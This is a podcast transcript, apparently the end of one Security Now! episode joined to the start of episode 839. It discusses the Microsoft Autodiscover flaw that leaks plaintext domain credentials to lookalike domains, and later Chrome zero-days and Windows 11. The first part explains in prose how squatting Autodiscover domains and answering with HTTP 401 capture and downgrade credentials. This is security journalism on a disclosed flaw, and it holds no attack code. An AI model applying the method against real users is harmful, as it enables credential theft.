So the crux of the problem is that one of the many things thrown at the wall is to emit queries to a subdomain of the email domain called "Autodiscovery."  So an HTTP query, or HTTPS, although believe it or not when S doesn't answer, the fallback is to HTTP, an HTTP query is sent to Autodiscovery.mail.example.com.  But again, because we're dealing with an ad hoc and weakly defined specification where Microsoft's stated goal is maximum resiliency - and that comes right off of their spec page - Microsoft said that it's not necessary to have the Autodiscovery subdomain be a subdomain of the user's email, since that might not be convenient.  So instead of Autodiscovery.mail.example.com, for example, the Autodiscovery service might also be at just Autodiscovery.example.com."  Sure.  So let's try that, too.



And you know there are all those tricky domains like example.co.uk where no one is really sure where the enterprise's domain name stops and the public domains begin.  And, after all, we want to be resilient.  So we wouldn't want to miss an available Autodiscovery server because we didn't try hard enough or look everywhere.  Therefore, since we're not sure how far back up the domain hierarchy we should go, and I'm not making this up, we'd better keep going until we either find an Autodiscovery server or we run out of domain name.



And believe it or not, that's what Outlook does.  Whereupon we all say in chorus, what could possibly go wrong?



LEO:  What could possibly go wrong?



STEVE:  How about, believe it or not, querying the domain Autodiscovery.com with an HTTP or HTTPS query, and here it is, containing the user's email address and their unencrypted email password, where those credentials are the same as they use to authenticate to their company's entire network domain?  It's unbelievable, but it's true.



Guardicore's Amit Serper [A-M-I-T S-E-R-P-E-R] published the result of their research titled "Autodiscovering the Great Leak."  Now that we have this bit of background, Amit's Executive Summary will make sense.  For his Executive Summary he wrote four bullet points:  "Autodiscover, a protocol used by Microsoft Exchange for automatic configuration of clients such as Microsoft Outlook, has a design flaw that causes the protocol to 'leak'" - and he's got "leak" in quotations because it's not, you know, it's like screaming it - "web requests to Autodiscover domains outside of the user's domain, but in the same TLD, for example, Autodiscover.com," believe it or not.



"Guardicore Labs acquired multiple Autodiscover domains with a TLD suffix and set them up to reach a web server that we control."  In other words, they got Autodiscover.il, Autodiscover.is, Autodiscover.sc, a bunch of them.  "Soon thereafter, we detected a massive leak of Windows domain credentials that reached our server.  Between April 16th of this year, 2021, to August 25th, 2021 we have captured 372,072 Windows domain credentials in total; 96,671 unique credentials that leaked from various applications such as Microsoft Outlook, mobile email clients, and other applications interfacing with Microsoft Exchange server."



Third bullet point:  "This is a severe security issue, since if an attacker can control such domains or has the ability to sniff traffic in the same network, they can capture domain credentials in plaintext, HTTP basic authentication, that are being transferred over the wire.  Moreover, if the attacker has DNS-poisoning capabilities on a large scale, such as a nation-state attacker, they could systematically siphon out leaking passwords through a large-scale DNS poisoning campaign based on these Autodiscover TLDs."



Finally:  "Additionally, we have developed an attack [they call] 'the ol' switcheroo'" - that's literally what it's called - "which downgrades a client's authentication scheme from a secure one, OAuth or NTLM, to HTTP Basic Authentication, where credentials are sent in clear text."



Okay, now, just as an aside so I don't forget to mention it later, the way this credential security downgrade attack works is to simply have the intercepting Autodiscover.whatever web server reply to the first query over OAuth or NTLM with an "I don't support that fancy protocol" reply, that's an HTTP 401 response from the web server, whereupon the client will reissue under HTTP basic authentication.  So not that tough.



So I'll just share the first three paragraphs of this much longer and more detailed report to reiterate the nature of this danger.  Amit writes:  "As a part of the ongoing security research efforts by the Guardicore Labs team, we have discovered an interesting case of credential leak affecting a large number of people and organizations worldwide.  The credentials that are being leaked are valid Windows domain credentials used to authenticate to Microsoft Exchange servers.  The source of the leaks is comprised of two issues:  First, the design of Microsoft's Autodiscover protocol and its back-off algorithm, specifically; second, poor implementation of this protocol in some applications."



They said:  "As mentioned, Microsoft's Autodiscover protocol was meant to ease the configuration of Exchange clients such as Microsoft Outlook.  The protocol's goal is to make an end-user able to completely configure their Outlook client solely by providing their username and password, and leave the rest of the configuration to Microsoft Exchange's Autodiscover protocol.  It is important to understand," Amit wrote, "that since Microsoft Exchange is a part of the Microsoft domain suite of solutions, the credentials that are necessary to log into one's Exchange-based inbox are in most cases also their domain credentials.  The implications of a domain credential leak in such scale are massive and can put organizations in peril.  Especially in today's ransomware-attacks-ravaged world, the easiest way for an attacker to gain entry into an organization is to use legitimate and valid credentials," which this is leaking on massive scale.



Okay.  Then skipping way down to some interesting and important details, Amit explains:  "The protocol" - and this is also directly from Microsoft's page, which I also read.  "The protocol has several iterations, versions, and modes.  Their full documentation can be found on Microsoft's website.  However, in this article we'll discuss a specific implementation of Autodiscover based on the [happily named] POX XML protocol."  That's P-O-X.



"In order to truly understand how Autodiscover works, we need to know what happens behind the scenes.  First, the client parses the email address supplied by the user."  And he gives this example, amit@example.com.  "The client then tries to build Autodiscover URLs based on the email address with the following format."  Okay, the first one:  https://Autodiscover.example.com/Autodiscover/Autodiscover.xml.  If nothing answers there, HTTP, meaning just drop SSL/TLS completely.  Let's just try it bare.  Okay.  Nothing answers there.  So then we go to https://example.com, that is, forget the Autodiscover, go to example.com/Autodiscover/Autodiscover.xml over HTTPS.  And if that doesn't answer, drop the S:  http://.



He says:  "In the case that none of these URLs are responding, Autodiscover will start its back-off procedure.  This back-off mechanism is the culprit of this leak because it is always trying to resolve the Autodiscover portion of the domain, and it will always try to 'fail up,' so to speak," he writes, meaning the result of the next attempt to build an Autodiscover URL would be http://Autodiscover.com/Autodiscover/Autodiscover.xml.  This means that whoever owns Autodiscover.com - Autodiscover.com, literally, really - will receive all of the requests that cannot reach the original domain.  He says:  "For more information about how Autodiscover works, please check out Microsoft's documentation."



And then comes the proof of concept.  Amit writes:  "In order to see if the Autodiscover leak scenario is even a viable one, we have purchased the following domains."  And there's a list of them:  Autodiscover.com.br, for Brazil.  Autodiscover.com.cn for China.  Autodiscover.com.co for Colombia  We have .es for Spain, .fr for France, .in for India, .it for Italy, .sg, .uk, .xyz, .online, .cc, .studio, .capital, .club, .company, .jp, .me, .mx, and .ventures.  Autodiscover in all of those.



He says:  "Later, these domains were assigned to a web server in our control, and we were simply waiting for web requests for various Autodiscover endpoints to arrive.  To our surprise, we started seeing significant amounts of requests to Autodiscover endpoints from various domains, IP addresses, and clients.  The most notable thing about these requests was that they requested the relative path of /Autodiscover/Autodiscover.xml with the Authorization header already populated with credentials in HTTP basic authentication," meaning cleartext.



He says:  "Now, as you might imagine, Microsoft" - oh, no, I'm sorry, he's not.  I'm saying.  That's the end of my quoting him.  As you might imagine, Microsoft is a little bent out of shape by this surprise revelation.  After Guardicore released their report, Microsoft issued the following huffy statement.  This is Microsoft:  "We are actively investigating and will take appropriate steps to protect customers.  We are committed to coordinated vulnerability disclosure, an industry standard collaborative approach that reduces unnecessary risk for customers before issues are made public.  Unfortunately, this issue was not reported to us before the researcher's marketing team presented it to the media, so we learned of the claims today."  Signed Jeff Jones, Senior Director, Microsoft.  And as you know, well, you don't know.



LEO:  But you're going to tell us, I hope.



STEVE:  But I'm going to tell you what you're going to know.  That would be okay, I mean, we could understand that, if the presentation given on Friday, March 31st, 2017, yes, more than four years ago, 4.5 years ago at 3:30 p.m., during Black Hat Asia 2017, had not been "All Your Emails Belong to Us:  Exploiting Vulnerable Email Clients via Domain Name Collision."



LEO:  Oh, my goodness.



STEVE:  Uh-huh.  They knew about it.



LEO:  Oh, my.



STEVE:  I have the link to the full PDF.  The abstract of that paper explains:  "The Autodiscover HTTP Service Protocol provides a way for Autodiscover clients to find Autodiscover servers.  This protocol extends the Domain Name System and directory services to make the location and settings of email servers available to clients.  In this paper, we take a closer look at the Autodiscover protocol and identify its threat model.  We analyze Autodiscover client implementations in two mobile built-in email clients to discover flaws which allow remote attackers to collect user credentials through domain name collision.  We discover how many clients have vulnerable implementations by collecting and analyzing HTTP request information received by our servers, registered with specially crafted domain names."  Sound familiar?  Uh-huh.



"We make our analysis based on data we collect from 25 different domains.  Our dataset contains information on about 11,720,559 requests" - that's approximate - "and we observe 9,726,026 requests containing authentication information.  We identify 2,173 different email clients which use vulnerable Autodiscover client implementations.  Finally, we propose different mitigation techniques for users, enterprises, and application developers to improve their email clients."



In other words, this recent work by Guardicore was a reminder to Microsoft of a directly related issue that was fully documented and disclosed 4.5 years ago which has never been fixed.  Apparently, because it directly wasn't aimed at you, Microsoft, and you were not given specific instructions about how to fix it, you just ignored the whole issue until now.  Your entire Autodiscover concept has always been an insecure bad idea, and nothing has changed during the intervening 4.5 years to make it any better or to resolve its fundamentally broken design.



Now, I realize, Microsoft, that you've got important work to do.  The world has been clamoring for Windows 11, after all.  So what is Microsoft doing?  As I mentioned at the top, Microsoft is now frantically registering the "Autodiscover" domain in - and Leo, you might want to put this page 12, the bottom of page 12 and top of page 13 on the screen - frantically registering...



LEO:  Good, because I don't want you to write it, I mean read it.



STEVE:  No, in every top level domain they can, just as fast as they can.  Friday, BleepingComputer's Lawrence Abrams wrote:  "At the time of this writing, BleepingComputer has confirmed that Microsoft registered at least 68 domains related to Autodiscover, which are listed below."  I have them in the show notes.  If we ever needed, I mean, so it's just like Autodiscover.everything.  I wished that there was an Autodiscover.wtf, but apparently we don't have that because that would have been perfect.



LEO:  There's wf.  That's close enough.



STEVE:  That's, yeah, that's what gave me the idea.  If we ever needed a clear example of a kludge, here it is.  This is Microsoft registering the domains which their clients, their email clients are querying while providing the username and password, which is typically their domain credentials, which can be used to log into their domain at their enterprise.  Microsoft registering those domains so that they will receive the query or blackhole it, rather than a hacker beating them to it.  And lord knows how many hackers have.



And understand, this really doesn't fix the problem because many of these domains are in foreign countries' controls.  DNS servers are in foreign countries' controls.  It hasn't been very useful for a foreign adversary to compromise a DNS server because the browser would check the web certificates.  Clients don't do that.  If a client is trying to autodiscover and nothing answers at https, it tries http.  Which means all a foreign adversary needs to do is intercept DNS and change the resolution of the autodiscover.* to a different IP, and that individual or entity will begin collecting domain credentials for all of the users who are autoconfiguring.



Lawrence continued:  "BleepingComputer also knows of 38 other domains registered since September 22nd whose owners are hidden behind privacy or WHOIS restrictions, that were also likely registered by Microsoft, researchers, or potentially threat actors."  Who knows?  "The actual number of registered domains is likely far larger," he writes, "as BleepingComputer has seen Microsoft register multiple Autodiscover domains for the same TLD, such as Autodiscover.com.es and Autodiscover.org.es."  In other words, I mean, this is a catastrophe.  You have to do Autodiscover dot whatever might be underneath it, or you'll miss one that will be leaking valid credentials.  One domain, Autodiscover.ch, has been registered since at least 2015, which is interesting, and uses Microsoftonline.com as its DNS servers, but it's not clear who owns it.



And Lawrence finishes:  "While registering Autodiscover.tld domains will block some of the leaks, Microsoft will need to issue fixes for the poor Autodiscover implementation in their Microsoft Outlook and Office 365 mail clients to resolve the issue further.  As other non-Microsoft applications also have faulty protocol implementations, Microsoft will also have to release guidance on how to properly create Autodiscover URLs so that credentials are not sent to untrustworthy domains."



In their coverage of this, Threatpost reached out to Alicia Townsend, who's the technology evangelist for OneLogin.  Alicia told Threatpost that it seems "incredible" that a product would send a user's username and password to an untrusted endpoint.  "The fact that this is happening with an incredibly popular Microsoft product such as Exchange is even more disheartening."  She pointed out that it's not clear how long this design flaw has been around - its like design has been around - given that the Exchange Autodiscover feature was introduced in Exchange 2007.  But regardless, it doesn't shine a good light on Microsoft.  "Whether the oversight was on the part of early developers or was introduced by more recent developers, it is clear that Security First was not their primary objective."



Right.  You can imagine that some large enterprise customer came to Microsoft shortly after 2007 and the introduction of, oh, look, your clients will now configure themselves, and complained that Exchange's Autodiscovery was not working for them due to their domain's naming structure.  So some genius over at Microsoft thought, "Ah, no problem.  Let's just have Outlook try everything until it finds something that works."  What could possibly go wrong?



And, you know, what if Amit had instead quietly and privately reminded Microsoft of something crucially important about the fundamental design of one of their protocols that they presumably already knew about?  Would they have taken action?  And if so, when?  Late last year and earlier this year they waited until it was too late, until their Exchange Server was being violently attacked, to begin fixing it, and then that fixing went on through the spring.  And as we noted last week, we're now at nine months since Microsoft was informed about the more serious of the many PrintNightmare problems, which has still not yet been resolved today.



Microsoft's official response to Amit's public disclosure was to say:  "We are committed to coordinated vulnerability disclosure, an industry standard collaborative approach that reduces unnecessary risk for customers before issues are made public."  Except of course this was made public 4.5 years ago.  But at what point does this become a means of stifling researchers' voices, shaming them into keeping quiet while the software publisher spends their time rounding off the pointy corners of windows and changing the Start Menu's alignment?



I have some personal experience with that myself.  As many of us recall, I tried mightily to explain to Microsoft that repackaging their NT-derived Windows 2000 operating system as WinXP, while leaving its unneeded raw socket API in place in a consumer OS, would be a real mistake.  It wasn't until their own WinXP operating system used its unneeded raw socket API to blast them with a devastating DDoS attack - the so-called MSBLAST worm - that they finally understood what I had been trying to tell them all along and then limited that API's ability to do harm in a subsequent XP service pack.



Given the evidence, we're seeing that Microsoft has become a company that only responds to force.  They must be forced to fix the things that are broken.  "Responsible disclosure" is just a courtesy, after all.  It's one that the industry might consider withdrawing if publishers do not honor their side of the implicit agreement to fix what's been responsibly disclosed.



LEO:  Right on.



STEVE:  This is just a catastrophe.



LEO:  Yup.  And by the way, somebody did register Autodiscover.wtf on September 22nd.  So I'm thinking it was probably Microsoft.  But we don't know because it's, you know, they hide the name of the contact.  It's just somebody in California.



STEVE:  No kidding.  Interesting.  I wonder what it resolves to.



LEO:  Yeah, well, hmm.  Yeah, it goes through Cloudflare.  So that's their name server.  Want to try, just out of curiosity?  It's probably Microsoft.  It's all happened in the last week, so, you know.



STEVE:  Unbelievable.



LEO:  Mr. Gibson is at GRC.com.  That's the place to go, the Gibson Research Corporation, where you will get, not only the world's best mass storage recovery and maintenance utility, SpinRite, currently 6.0, but 6.1's on the way, and you can help in the development of it.  If you get your copy now, you'll get a free upgrade.  He also has this show, 16Kb audio, 64Kb audio, fully human-written transcriptions thanks to Elaine Farris.  That's all at GRC.com.  Leave Steve feedback there at GRC.com/feedback, or on his Twitter, @SGgrc.  His DMs are open, so you might want to stop by there.



Of course we have copies of the show at our website, TWiT.tv/sn.  There's a YouTube channel with a video of every show.  And of course any podcast app should be able to find this in our 17th year.  If it's not in your podcast directory by now, I guess you just don't like us.  Go ahead and get any podcast app.  Subscribe.  Do me a favor.  If they allow reviews, leave Steve a five-star review, and let the world know about your love for Security Now!.  I think the world needs to hear a little bit more Security Now!; don't you?



We do the show, if you want to hear us live, do it live, we do the show every Tuesday, about 1:30, right after MacBreak Weekly, so 1:30 to 2:00 Pacific.  That'd be 4:30 Eastern, 20:30 UTC.  The live streams, audio and video, are at TWiT.tv/live.  People who listen live or watch live often like to chat live with our IRC server, irc.twit.tv.  That's there all the time, 24/7, as is our Discord for Club TWiT members.  And you're invited to hang out there with them if you're watching live.  Steve, wonderful, as always.  I will see you next week.  Are you going to watch Episode 3 of "Foundation" this week?



STEVE:  Oh, yeah.  Oh, yeah.



LEO:  Give it a shot?



STEVE:  I'm, you know, I'm...



LEO:  Got to know what happens.  Got to know what happens.



STEVE:  I just - now my expectations have been set appropriately.



LEO:  Yeah.  It's just pretty to watch.



STEVE:  It is very pretty.  And knowing that I can have subtitles, yay.  I mean, I'm afraid - I hate subtitles, but that's the solution.



LEO:  You know, I get used to it because a lot of things are hard to understand these days, and I just turn on subtitles.  I ignore them until I need them, and then I look down and say, what did he say?  Or just press that button, say what the hell did he just say?



STEVE:  Ah, love that.



LEO:  That is a nice feature.



STEVE:  Okay, buddy.



LEO:  I think that's the single best feature of the Apple TV.  Thanks, Steve.  Have a great week.



STEVE:  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#839

DATE:		October 5, 2021

TITLE:		Something Went Wrong 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-839.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we, of course, look at the massive global outage that took down all Facebook services for six hours yesterday.  But before we get there we look at this week's new pair of zero-day flaws which Google fixed in Chrome.  We note the arrival of Windows 11 with a yawn, and also caution about one known flaw that it's already known to have.  We look at some potential for global action against ransomware, and some possible movement by the FCC to thwart SIM swapping and number transporting attacks.  We also examine a widespread Android trojan which is making its attackers far too much money.  And speaking of money, there's a known flaw in Apple Pay when using a Visa card that neither company wants to fix.  And finally, after a quick check-in on SpinRite, we're going to examine what exactly did "go wrong" at Facebook yesterday.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Boy, do we have a packed show for you.  There is a big Android malware going around.  Steve will talk about that.  Windows 11 is here, but is it ready for primetime?  And then Steve breaks down step by step what went wrong at Facebook yesterday and what we can learn from it.  It's all coming up next on Security Now!.	



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 839, recorded Tuesday, October 5th, 2021:  Something Went Wrong.



It's time for Security Now!.  Check your BGP routing tables, kids.  Here he comes.  He knows where he is, thanks to DNS:  Mr. Steve Gibson, the man in charge.



STEVE GIBSON:  Yo, Leo.



LEO:  Hey, Steve.  How are you?



STEVE:  Good to be with you again for our, what is this, this is the first podcast of October.



LEO:  Holy moly.



STEVE:  And of course our listeners, and you'd have to be under a rock - actually, there was one guy who was playing videogames all day yesterday, and I got a tweet from him at the end of the day.



LEO:  What happened?  	



STEVE:  Saying "Oh, my god."  Because, I mean, he suddenly resynchronized with the rest of the world, and learned what we all knew, was that Facebook, all their properties - Facebook, Instagram, Oculus VR, and WhatsApp, all had a massive, well, comparatively, six-hour outage.  So today's podcast gets its name from this wonderful page which was being displayed yesterday.  If you insisted on going to www.facebook.com, up came this page titled "Something Went Wrong."  And so of course that's the title of today's podcast:  "Something Went Wrong."



So we're going to explain what happened.  And sort of it was fun because I was already working on today's podcast yesterday in the morning when this all began to happen, so I was able to  tweet in real-time and do some digging around and see what was happening.  I think it's going to be a fun and interesting podcast for our listeners.



But before we get there, we're going to take a look at this week's new pair of zero-day flaws from you-know-who.  Google fixed them in Chrome.  In fact, I forgot to try it this morning.  I was unable to update to the latest one yesterday, all day.  And I thought, maybe this has something to do, like maybe it's weirdly tied in with Facebook because I've never had an update server failure from Google.  But I was unable to update Chrome yesterday.  Anyway, we were supposed to, we should, because two more zero-days.  So we'll talk about those.



We're just going to note the arrival of Windows 11 with a little bit of a yawn, but also caution about one known flaw that it's already known to have, a pretty serious memory leak problem in Explorer.  We're also going to look at some potential for global action against ransomware, and some possible movement, but don't hold your breath on this either, by the FCC to thwart SIM swapping and number transporting, or "porting" as it's abbreviated, attacks.  We also examine a widespread Android trojan which is making its attackers far too much money, which unfortunately I think means we're going to be seeing more like this.



And speaking of money, I know you mentioned it on MacBreak Weekly.  There's a known flaw in Apple Pay when using a Visa card that's set in its transport mode.  Interestingly, both companies have been notified.  Neither one wants to fix it.  So it's still a problem.  Anyway, we'll be talking about that.  I've got a quick check-in on SpinRite.  And then we're going to examine what exactly did go wrong at Facebook yesterday?



LEO:  I was counting on that.  I said, "Steve will definitely cover this."



STEVE:  And just sort of apropos of that, I've had a picture sitting in the queue for a long time, a fun Picture of the Week showing Earth's submarine cable network.



LEO:  Oh, I've seen that, yeah.  Very cool.  Yeah.  It's amazing.



STEVE:  And we'll talk about that on the other side.



LEO:  Good.  Steve, shall we look at the Picture of the Week?



STEVE:  This diagram really is fascinating.



LEO:  You've been looking at it the whole time, haven't you.  You're funny.



STEVE:  I have.  It's really interesting.  I mean, it's not something you normally think about.  But over land we have fibers running around all over the place.  But how do you get across the Atlantic or across the Pacific?  Or actually, based on this chart, even like down the coast of Africa?



LEO:  The Bering Strait, yeah.



STEVE:  Yeah.  And in fact now it's gotten - bandwidth is such a thing that Google and Facebook are laying their own cables, like that they will control.  So this isn't just like, you know, originally it was so expensive that you'd put together multiparty ownership in order to share the cost.  But with Google and Facebook being as large as they are, there's some ship heading off with a big roll of fiber optic cable on its back, slowly unspooling.  And when you think about it there's, like, nothing to contain a cable; right?  A submarine cable?  It just rolls out the back of the ship and lays on the ground.  And, you know, best of luck.



And of course it turns out that maintenance is a problem.  There are things that are cutting them.  Earthquakes are a problem.  Anchors of other ships, you know, you drop anchor, and when you pull it up, you drag a cable up with you and go, whoops, and, you know, slip it off the anchor and hope, and then quickly move your ship so that, you know, you hope that you didn't cut the cable and create problems.  So anyway, this chart in the show notes is the earth's submarine cable network which the predominant traffic is from the U.S., both coasts of the U.S. over to their respective other sides on the other side of the Pacific and the Atlantic in order to connect all of this together.  So we're able to talk to each other and annoy each other for, like, nothing anymore.



LEO:  [Crosstalk] on these cables right now.  Right?  Yeah.



STEVE:  Yeah.  That is really just something.  So it's just sort of a cool thing.  In fact, look at that little thing down there, it looks like it's a little blip like from the - it looks like it's linking opposite sides of Texas or something.  It's like, what is that down there in the Gulf, in our Gulf?  It's like a little blip.



LEO:  It's a funny one, isn't it.



STEVE:  Cheaper to go by sea than by land, apparently.



LEO:  Yeah.  Houston and New Orleans or something.  That's weird, yeah.



STEVE:  Sort of a little jumper, a little jumper cable.



LEO:  It does, doesn't it, yeah.



STEVE:  Anyway, just very cool.  Okay.  So another two in-the-wild, true zero-days found and fixed in Chrome.  In fact, right now while I'm here, because it'll take no time, I'm going to fire up Chrome.  And I just fired up PaintShop Pro by mistake.  I pressed the wrong icon.



LEO:  So easy to do.  I understand.



STEVE:  Yes, PSP6, still my go-to.  Let's see.  So Help > About Google Chrome.  Oop, I'm still getting an error.  "An error occurred while checking for updates:  Update check failed to start.  Error code 3:  0x80004002 - system level."  And then it says "Learn More."  And when you click on that, as I did and as I have been recently, it's taking a while to load.  Ooh, now, I wonder if a lot of people are clicking on that.  Anyway, what it tells you is that errors 3 and 11 are upgrade server is not found.  And I'm not even getting that page up now.  That's interesting.  Everything else is working fine.



Anyway, their most recent update late last week resolved yet another pair of authentic zero-day vulnerabilities which were found being exploited in the wild, thus authentic zero-day vulnerabilities and not let's just call everything a zero-day.  For those keeping score at home, this brings us to 14 so far this year, as we finish with month nine and start into month 10.  And as I said, when I went to Chrome to ask it to update itself, because I always seem to have to give it a little nudge - and what have you got there, Leo?  You're showing...



LEO:  94, it says.



STEVE:  94.  And I've got it in my notes...



LEO:  94.0.46.  This is on the Mac, of course.



STEVE:  Ah.  But at the end is it .71 or .61?



LEO:  Dot 71.



STEVE:  Okay.  You've got the latest.  I'm stuck on .61, and I don't seem to be able, at two locations, to be able to get Chrome to update itself to .71.



LEO:  Maybe it's a Windows thing, yeah.  Huh.



STEVE:  Interesting.  Or you just slipped in and got lucky maybe.



LEO:  I got lucky, yeah.



STEVE:  Because, I mean, even now it's like saying, uh, can't get there.  Anyway, so issues were CVE-2021-37975 and 976.  They were found and, as Google does, immediately put to rest.  They were fixed by a total of four patches surrounding a, once again, a use-after-free flaw in the VB JavaScript and WebAssembly engine, as well as an information leak from Chrome's core.  The discovery and report of the 975 flaw was credited to an anonymous researcher, so we don't know who, some good person.



But 976 was found by the same researcher within Google's own TAG team, who also discovered the actively exploited use-after-free flaw in Chrome's Portals API that we talked about last week.  And eventually, for me and for whoever else might be having a problem, and I'll check Twitter when we do our next sponsor break, Leo, see if other reports are of a problem.  But I'm right now still stuck at .61, which is where we were with last week's podcast, trying to get to .71.



So anyway, it's not an emergency.  These are going to be probably targeted attacks.  It is the case, we know that once they become public, they do tend to get used more quickly because now they have a window of opportunity, which is not for me closing as quickly as it should be.  But anyway, Google's on it.  And, you know, I was thinking about this.  At what point do we start saying this is an awful lot of zero-day vulnerabilities?



I think Google probably takes a bit more heat over these than they deserve, since whereas this does bring the total to 14 zero-day vulnerabilities so far this year, Microsoft fixes scores of such problems every month.  And even then only after they decide to stop ignoring them for many months beforehand.  So I still think Google is doing the right thing, and I'm glad that we're down essentially to two browsers; right?  We've got Firefox, and we have Chromium, you know, Chrome, Chromium, and all of its users.  So, good.



Windows 11.  Yesterday, thanks to a tweet from Paul Thurrott, we have the official Windows 11 download page.  So since I was in a tweeting mode while I was following all of this interesting Facebook adventure, I said: "Anyone seeking additional pain can now obtain the official Windows 11 directly from Microsoft."  Then I said, in parentheses:  "(I would call it the 'Final Windows 11,' but who are we kidding?)"  So, yeah, this notion of a final Windows, well, we've been disabused of that completely, thanks to the Windows 10 adventure.  We never did have a final Windows 10.  And now we definitively know that they say they never intended Windows 10 to be the last Windows ever.



So every few years I assume Microsoft will find something new to do to the UI that allows them to increment Windows major version number and to enforce some new random and arbitrary restriction on which machines it will run on.  And, you know, because I'm a pragmatist, I'm pretty sure that Microsoft will never lose me as a user.  For me, the things I need to do, Windows is far more practical than any of the alternatives, though I certainly acknowledge that the alternatives are getting a lot better.  But still, Microsoft has and they continue to needlessly discard bits and pieces of my respect for no good reason.  I'm just unimpressed with the way they're conducting themselves.  The fact that I have to actually remove Candy Crush Soda Saga from my Start menu, are you kidding me?  Like, whoa.



Anyway, to make finding Windows 11 easy, I created the shortest practical and easy-to-remember grc.sc shortcut possible.  It's just, of course, 11.  So grc.sc/11.  And that will bounce you to Microsoft's official, it's all there now for everybody who wants it, software download Windows 11 page.  And you can download.  You can get the ISO.  You can download it onto a ready-to-install USB.  I mean, they've got that much worked out, at least.  So yay for that.



And speaking of Windows 11, we have a known memory leak in Windows Explorer for Windows 11.  PC Gamer notes that "Windows 11 will soon be rolling out," and then rhetorically asks:  "But will File Explorer keep chomping through your RAM?"  At least in what they believe they have, it will.  It seems that among the many known new bugs which Windows 11 is introducing is a big new memory leak in Windows File Explorer.



So PC Gamer informs us that:  "The Windows 11 File Explorer memory leak bug, which surfaced a couple of months ago, thanks to the keen eyes of one Windows 11 Insider preview user, is outlined in a post by user gyrohan269 on the Windows 11 subreddit.  They note that with each instance of Windows File Explorer opened, the RAM usage stacks and doesn't disperse upon exiting.  The post was met with thousands of upvotes from those experiencing the same thing, and plenty of comments from users who were able to replicate the issue."



So they wrote:  "We're currently running version 22000.194," they say, "which we believe" - and I do, too - "is the release version, on our test bench," they wrote.  And this author said:  "And I was able to reliably replicate the bug several times.  And, no, the RAM usage still hasn't freed up even after about half an hour of waiting."



They wrote:  "If you want to check this is a problem for your own Windows 11 version, open Task Manager now and sort your processes by highest memory usage.  Then," they wrote, "spam the Win+E," you know, key combination.  They said:  "You'll notice Explorer rise up the list pretty fast.  And once you've closed them all, keep an eye out to see if the memory frees up."



There doesn't seem to be an official acknowledgement of the issue anywhere, let alone news of a coming fix.  Which, again, they've known about it for months.  It's been not acknowledged by Microsoft, but a lot of noise has been made.  Yet they're shipping it anyway because, eh, we'll fix it in post.  Thankfully it has been logged in the Feedback Hub; so, if you could replicate it, this PC Gamer site - I have the link in the show notes - suggests to pile on so Microsoft will be made aware that this is a wide-ranging issue.



LEO:  There are so many, though.  I wouldn't count on getting bumped to the top of the list.



STEVE:  Oh, I know, Leo.  I know.



LEO:  Even, as you know, Paul thinks it's way too early.  As you said.



STEVE:  Yes.  In fact, it was interesting because I heard him, yes, basically echoing me, yes.



LEO:  On the show he said that, yeah, yeah.



STEVE:  On last Wednesday's Windows Weekly he said:  "Come on, really?  This is not even beginning to be ready."  But the show must go on.  Hey, I figure once the corners have been rounded, it's like, well...



LEO:  It's done.



STEVE:  I mean, it's like they've given up; right?  They've just like, oh, you know.  Yeah.  Like we're never going to get this right.  We're never going to actually finish this.  So let's just push out a stream of these.  Now we'll just call it 11 rather than 10.  



LEO:  It is interesting, though, that we are now accustomed to the notion that every bit of software is constantly updated; right?  There's no longer this sense that anything's done.  We know it's all going to be updated forever until they stop, until they give up.



STEVE:  Well, you know, we know the lone, the sole voice in the wilderness.



LEO:  Yes.  Oh, yeah, you have one program, yeah, okay.  All right.  No bugs in your software.



STEVE:  Well, and when it's done, somebody over in the Spinrite.dev newsgroup the other day suggested, pointed me to some fancy automated system for automatically checking for patches and downloading them and integrating them in software that had already been shipped.  I mean, like proposing that I use that.  And I said...



LEO:  Why?  Why?



STEVE:  You know, SpinRite 6 hasn't changed since '04.  The DNS Benchmark hasn't changed since I shipped it.  Or it's like there was a couple little things shortly after launch, but then it's fine.  Never10, well, not since 10.  SQRL never had a bug, and I didn't touch it since I finished it.  So yeah.  And in fact I do have a DNS-based means for all the software moving forward to ping a pseudo server that I run to just check to see if anything might have changed.  All is quiet on that front.



LEO:  Although that's prudent, to put that in, if you had to do a patch; right.



STEVE:  Yeah, makes sense.



LEO:  Yeah.



STEVE:  Makes sense to have it.  Because of course the moment you don't, well, actually not even then.  But still.  But Leo, I take your point.  Yes.  All other software is just a moving target.  It's like, well, you know.  And really I have the newsgroup gang to thank because I'm getting ready to launch the next release.  And they will happily pound on it and will find some obscure stuff where, if you touch your nose when you're standing on your right foot and spin around three times and hit ENTER while coughing, then oop, look, sure enough, it's a different shade of green on the screen or something.  But I would rather fix it now than fix it later.



Okay.  There is some news, kind of, on the ransomware and cyberwarfare front.  And what's sad is even that we have a term "cyberwarfare."  Okay.  The U.S. announced last Friday that the administration will be conducting a series of online virtual meetings with representatives from 30 countries, because after all they're online and virtual, so let's just all get ourselves a little Zoom window, and we're going to do this.  Or maybe we're going to have somebody on that stage that we saw, right, Biden was doing a bunch of, I don't know what they were, but lots of little windows, and everybody was talking at once.  Anyway, this will include NATO allies and G7 partners on the topic of cybercrime, with an explicit focus on ransomware and the concomitant abuse of cryptocurrency.



In their press release on the topic, the White House said:  "This month, the United States will bring together 30 countries to accelerate our cooperation in combating cybercrime, improving law enforcement collaboration, stemming the illicit use of cryptocurrency, and engaging on these issues diplomatically."  And actually I didn't make it into the show notes, but I did see in passing that the U.K. has budgeted a bunch of money.  I had to do a double-take.  And apparently it involves proactive cyberwarfare.  It's like, ooh, the tip of the spear.  So okay.  Or the tip of the packet, at least.  Accordingly to the release, additional topics to be discussed will include 5G technology, supply chain attacks, quantum computing - I'd love to be a fly on the wall for that discussion with 30 countries - and AI.



